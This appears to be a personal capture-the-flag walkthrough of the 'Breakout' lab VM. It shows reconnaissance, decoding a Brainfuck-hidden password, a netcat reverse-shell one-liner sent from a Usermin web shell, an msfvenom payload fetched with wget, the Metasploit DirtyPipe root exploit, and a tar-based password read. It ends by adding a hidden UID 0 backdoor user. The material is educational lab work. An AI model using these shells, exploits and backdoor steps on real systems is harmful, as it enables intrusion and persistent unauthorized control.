@@ -1,0 +1,248 @@
+
+IP - 10.0.2.17
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+nmap result
+
+# Nmap 7.93 scan initiated Mon Jan 30 16:47:20 2023 as: nmap -sC -sV -p- -oN nmap_all_port.txt 10.0.2.17
+Nmap scan report for 10.0.2.17
+Host is up (0.00011s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
+|_http-server-header: Apache/2.4.51 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+139/tcp   open  netbios-ssn Samba smbd 4.6.2
+445/tcp   open  netbios-ssn Samba smbd 4.6.2
+10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
+|_http-title: 200 &mdash; Document follows
+20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
+|_http-title: 200 &mdash; Document follows
+MAC Address: 08:00:27:3E:6F:93 (Oracle VirtualBox virtual NIC)
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+|_clock-skew: 1s
+|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
+| smb2-time: 
+|   date: 2023-01-30T10:17:37
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jan 30 16:48:05 2023 -- 1 IP address (1 host up) scanned in 45.17 seconds
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Found brainfuck code End Of The Line:
+
+view-source:http://10.0.2.17/
+
+<!--
+don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
+
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
+
+
+-->
+
+Decrypted
+
+.2uqPEfj3D<P'a-3 
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Enumerating smb with enum4linux:
+
+enum4linux -a 192.168.100.53
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                 
+                                                                                                                                                                                            
+S-1-22-1-1000 Unix User\cyber (Local User)
+
+Found Username - cyber
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I logined with username cyber and password .2uqPEfj3D<P'a-3 into https://192.168.100.53:20000/ (usermin)
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I found command shell web page in here:
+
+https://192.168.100.53:20000/shell/index.cgi?xnavigation=1
+
+Execute rev shell payload:
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.100.29 4445 >/tmp/f
+
+Got reverse shell.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+1st Flag:
+
+cyber@breakout:~$ cat user.txt
+3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation
+
+Generate meterpreter reverse payload with msfvenom
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.29 LPORT=5555 -f elf > reverse.elf
+
+File transfer with python
+
+python2 -m SimpleHTTPServer 8888
+
+Download with wget
+
+wget http://192.168.100.29:8888/reverse.elf
+
+cyber@breakout:/tmp$ chmod +x reverse.elf 
+
+Before executing the payload need to listen from msfconsole first
+
+cyber@breakout:/tmp$ ./reverse.elf 
+
+
+
+Listening with metasploit
+
+use exploit/multi/handler
+
+set payload linux/x86/meterpreter/reverse_tcp
+
+After getting meterpreter shell
+
+and then use background
+
+use multi/recon/local_exploit_suggester
+
+target is vulnerable into exploit/linux/local/cve_2022_0847_dirtypipe
+
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/cve_2022_0847_dirtypipe
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > options
+
+Module options (exploit/linux/local/cve_2022_0847_dirtypipe):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   COMPILE           Auto             yes       Compile on target (Accepted: Auto, True, False)
+   SESSION                            yes       The session to run this module on
+   SUID_BINARY_PATH  /bin/passwd      no        The path to a suid binary
+   WRITABLE_DIR      /tmp             yes       A directory where we can write files
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set SESSION 1
+SESSION => 1
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set LHOST 192.168.100.29
+LHOST => 192.168.100.29
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set LPORT 7878
+LPORT => 7878
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > exploit
+
+[*] Started reverse TCP handler on 192.168.100.29:7878 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0
+[*] Writing '/tmp/.wjdtbc' (35592 bytes) ...
+[*] Executing exploit '/tmp/.wjdtbc /bin/passwd'
+[*] Sending stage (3045348 bytes) to 192.168.100.53
+[+] Deleted /tmp/.wjdtbc
+[*] Meterpreter session 2 opened (192.168.100.29:7878 -> 192.168.100.53:58900) at 2023-01-31 02:34:07 +0630
+
+meterpreter > getuid
+Server username: root
+
+root flag
+
+root@breakout:~# cat rOOt.txt
+cat rOOt.txt
+3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
+
+Author: Icex64 & Empire Cybersecurity
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Another way of Priv Escalation (Zip arbitrary file read 	)
+
+Reference: https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/
+
+Found old backup file at /var/backups/.old_pass.bak and tar can run at home directory
+
+so create tar achive
+
+./tar -cf root.tar /var/backups/.old_pass.bak
+
+and now we can extract as cyber
+
+./tar -xf root.tar
+
+found var directory
+
+cyber@breakout:~$ cd var
+cyber@breakout:~/var$ ls -la
+total 12
+drwxr-xr-x 3 cyber cyber 4096 Jan 30 15:27 .
+drwxr-xr-x 9 cyber cyber 4096 Jan 30 15:27 ..
+drwxr-xr-x 2 cyber cyber 4096 Jan 30 15:27 backups
+cyber@breakout:~/var$ cd backups/
+cyber@breakout:~/var/backups$ ls -al
+total 12
+drwxr-xr-x 2 cyber cyber 4096 Jan 30 15:27 .
+drwxr-xr-x 3 cyber cyber 4096 Jan 30 15:27 ..
+-rw------- 1 cyber cyber   17 Oct 20  2021 .old_pass.bak
+cyber@breakout:~/var/backups$ cat .old_pass.bak 
+Ts&4&YurgtRX(=~h
+
+
+got root passowrd - Ts&4&YurgtRX(=~h
+
+cyber@breakout:~/var/backups$ su root
+Password: 
+root@breakout:/home/cyber/var/backups# whoami
+root
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Add new user as root 
+
+root@vulnix:~# useradd -ou 0 -g 0 lol
+root@vulnix:~# passwd lol
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+
+user - lol
+password - test1234
+
+
+
